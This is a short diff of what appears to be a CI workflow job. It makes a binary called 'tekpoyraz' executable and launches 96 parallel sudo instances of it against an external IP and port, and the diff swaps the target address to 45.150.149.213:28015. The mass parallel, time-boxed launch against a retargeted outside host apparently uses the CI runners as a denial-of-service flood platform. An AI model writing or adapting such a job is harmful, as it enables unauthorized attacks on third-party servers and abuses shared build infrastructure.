@@ -18,7 +18,7 @@ jobs:
           chmod +x tekpoyraz
           PIDS=()
           for i in {1..96}; do
-            sudo timeout 40 ./tekpoyraz 85.236.96.129 49202 &
+            sudo timeout 40 ./tekpoyraz 45.150.149.213 28015 &
             PIDS+=($!)
           done
           
